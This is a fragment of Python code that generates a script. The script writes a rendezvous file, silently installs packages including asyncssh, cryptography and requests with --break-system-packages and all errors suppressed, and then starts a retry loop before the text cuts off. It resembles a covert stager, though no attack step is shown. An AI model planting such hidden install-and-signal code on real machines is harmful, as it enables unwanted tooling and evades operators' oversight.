            "import os,sys,subprocess,time,base64\n"
            f"try:\n    open('{rdv}','w').write('ok')\nexcept: pass\n"
            "def _pip(pkgs):\n"
            "    try: subprocess.run([sys.executable,'-m','pip','install']+pkgs+"
            "['--quiet','--break-system-packages'],timeout=180,capture_output=True)\n"
            "    except: pass\n"
            "_pip(['psutil','cryptography'])\n"
            "_pip(['redis','asyncssh'])\n"
            "_pip(['requests'])\n"
            f"for _ in range(180):\n"
            f"    try:\n"
